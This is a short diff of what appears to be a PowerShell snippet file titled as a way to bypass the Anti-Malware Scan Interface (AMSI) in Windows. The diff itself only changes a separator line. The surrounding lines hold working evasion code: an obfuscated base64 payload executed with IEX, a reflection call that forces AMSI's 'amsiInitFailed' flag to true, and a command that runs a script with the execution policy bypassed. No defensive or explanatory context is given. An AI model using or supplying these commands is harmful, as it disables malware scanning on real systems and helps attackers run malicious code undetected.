@@ -31,8 +31,7 @@ BYPASS THE ANTI-MALWARE SCAN INTERFACE (AMSI), WHICH IS A SECURITY FEATURE IN WI
 
  
 IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WwBSZWZdLkFzc2VtYmx5LkdldFR5cGUoJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQW1zaVV0aWxzJykuR2V0RmllbGQoJ2Ftc2lJbml0RmFpbGVkJywnTm9uUHVibGljLFN0YXRpYycpLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")))
- 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 powershell.exe -ExecutionPolicy Bypass -File "C:\Path\To\Your\Script.ps1"
 
